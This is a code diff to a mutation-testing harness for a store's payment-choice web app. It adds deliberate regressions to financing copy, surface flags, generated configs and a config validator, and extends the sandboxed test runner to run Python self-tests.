+    "      spec.textContent = FC('sheetDone');",
+    "      spec.textContent = FC('agendaDone');", PAY_COPY],
+  ["payment: an adopted D4 key disappears from the canonical source",
+    '      "paymentPreferenceLabel": {',
+    '      "paymentPreferenceLabelRetired": {', PAY_COPY, "incoming/lacks_financing.json"],
+  ["payment: the generated production config drifts from the canonical source",
+    '      "exploreConsequence": {',
+    '      "exploreConsequenceDrifted": {', PAY_COPY, "data/store-config.json"],
+  ["payment: the demo bundle's financing block drifts from production",
+    '        "en": "Payment preference",',
+    '        "en": "Payment preferences",', PAY_COPY, "demo/black-friday/data/store-config.json"],
+  ["payment: the governed no-submission sentence is reworded",
+    "Nothing is submitted and no application is started.",
+    "Nothing is sent right now.", PAY_COPY, "incoming/lacks_financing.json"],
+
+  // Taxonomy/renderer.
+  ["payment: promotional paths stop grouping by provider (one path per PLAN)",
+    "      finPromotionalByProvider(groups.promotional).forEach(function(grp) {\n        var provider = grp.provider;\n        paths.push({",
+    "      groups.promotional.forEach(function(grp) {\n        var provider = grp.provider;\n        paths.push({", PAY_RENDER],
+
+  // ---- Slice 4 / D4: per-surface placement (item 1.5) ----------------------
+  // Config-DISABLING rather than deleting only means something if the flag is
+  // actually consulted, if a MISSING flag still means enabled, and if the
+  // dormant surface really is still there to re-enable.
+  ["payment: the drawer surface flag is ignored (a disabled surface renders anyway)",
+    "      if (!financingEnabled() || !finSurfaceEnabled('drawer')) {",
+    "      if (!financingEnabled()) {", PAY],
+  ["payment: the Sleep System surface flag is ignored",
+    "      var financingBlock = (financingEnabled() && finSurfaceEnabled('sleepSystem'))",
+    "      var financingBlock = financingEnabled()", PAY],
+  ["payment: a MISSING surface flag is treated as DISABLED (breaks every other deployment)",
+    "      return surfaces[name] !== false;",
+    "      return surfaces[name] === true;", PAY],
+  ["payment: the malformed-surfaces guard is dropped (a null surfaces block throws)",
+    "      if (!surfaces || typeof surfaces !== 'object') return true;",
+    "", PAY],
+  ["payment: the shipped drawer surface policy silently flips back on",
+    '      "drawer": false,',
+    '      "drawer": true,', PAY, "incoming/lacks_financing.json"],
+  ["payment: the generated config's surface policy drifts from the canonical source",
+    '      "sleepSystem": false',
+    '      "sleepSystem": true', PAY_COPY, "data/store-config.json"],
+
+  // ---- Slice 4 / C13: the config-admission gate ---------------------------
+  // Restores the exact bypass an external review found on this branch: scoping
+  // the required-copy contract to a DECLARED `experience` rather than to
+  // `enabled`. The runtime never reads `experience`, so under the bypass an
+  // enabled financing block that predates the field validated green and then
+  // rendered blank Payment Choice controls to a customer. No runtime suite can
+  // see this — the defect is in what the build lets through, not in what the
+  // page does — which is why the observer is the validator's own self-test.
+  ["payment: required copy is scoped to a DECLARED experience again (C13 bypass)",
+    'if _exp is None or _exp == "payment-choice":',
+    'if _exp == "payment-choice":', PAY_VALIDATOR, "tools/validation.py"],
+
 ];
 
 // ---------------------------------------------------------------------------
@@ -858,10 +1357,15 @@ if (process.argv.includes("--list")) {
 
 const sandbox = mkdtempSync(join(tmpdir(), "df-mutsweep-"));
 process.on("exit", () => { try { rmSync(sandbox, { recursive: true, force: true }); } catch {} });
-for (const d of ["tests", "data", "docs", "tools", "incoming"]) {
+// `demo` joins the copy set so a mutation of the GENERATED demo bundle is
+// observable: the financing copy propagation chain ends there, and a drifted
+// demo would otherwise be unreachable from this sandbox.
+for (const d of ["tests", "data", "docs", "tools", "incoming", "demo"]) {
   cpSync(join(root, d), join(sandbox, d), { recursive: true });
 }
-for (const f of ["index.html", "Code.gs"]) cpSync(join(root, f), join(sandbox, f));
+// CLAUDE.md joins the copy set because the trust suite pins that it carries no
+// paragraph legitimizing retailer prose in the quiz contract.
+for (const f of ["index.html", "Code.gs", "CLAUDE.md"]) cpSync(join(root, f), join(sandbox, f));
 
 // Per-target pristine sources. Entries name their target with a fifth field;
 // index.html is the default. Every mutated target is restored before the next
@@ -871,15 +1375,47 @@ const PRISTINE_BY_FILE = {
   "index.html": PRISTINE,
   "Code.gs": readFileSync(join(sandbox, "Code.gs"), "utf8"),
   "data/dict-es.json": readFileSync(join(sandbox, "data", "dict-es.json"), "utf8"),
+  "data/dict-en.json": readFileSync(join(sandbox, "data", "dict-en.json"), "utf8"),
+  // The financing copy propagation chain: authored source, generated
+  // production config, generated demo bundle. Mutating each in turn proves the
+  // chain is actually compared rather than assumed.
+  "incoming/lacks_financing.json":
+    readFileSync(join(sandbox, "incoming", "lacks_financing.json"), "utf8"),
+  "data/store-config.json":
+    readFileSync(join(sandbox, "data", "store-config.json"), "utf8"),
+  "demo/black-friday/data/store-config.json":
+    readFileSync(join(sandbox, "demo", "black-friday", "data", "store-config.json"), "utf8"),
+  // The build-time gate itself. index.html decides what a customer sees given
+  // a config; the validator decides which configs may exist at all, and a hole
+  // there is invisible to every runtime suite — which is precisely how the
+  // `experience` bypass shipped green.
+  "tools/validation.py":
+    readFileSync(join(sandbox, "tools", "validation.py"), "utf8"),
+  // Trust gate: the generated quiz copy and the correspondence document that
+  // governs it. Mutating each proves the suite compares them rather than
+  // trusting either.
+  "data/quiz.json": readFileSync(join(sandbox, "data", "quiz.json"), "utf8"),
+  "docs/quiz-copy-engine-correspondence.md":
+    readFileSync(join(sandbox, "docs", "quiz-copy-engine-correspondence.md"), "utf8"),
 };
 
+// Observers are node suites by default. The validator's self-test is the one
+// PYTHON observer, and the fact that it lives inside the very file it
+// validates is what makes it the correct observer for a validator mutation:
+// restore the bypass in the implementation half and the assertion half goes
+// red in the same process, with no cross-file wiring to get stale. Entries may
+// carry arguments, so the string is split rather than passed whole.
 function runSuites(suites) {
   const red = [];
   for (const s of suites) {
+    const argv = s.split(" ");
+    const py = argv[0].endsWith(".py");
     try {
-      execFileSync("node", [s], { cwd: sandbox, stdio: "pipe", timeout: 180000 });
+      execFileSync(py ? "python" : "node", argv,
+                   { cwd: sandbox, stdio: "pipe", timeout: 180000 });
     } catch {
-      red.push(s.replace("tests/", "").replace("_check.mjs", ""));
+      red.push(argv[0].replace("tests/", "").replace("tools/", "")
+                      .replace("_check.mjs", "").replace(".py", ""));
     }
   }
   return red;
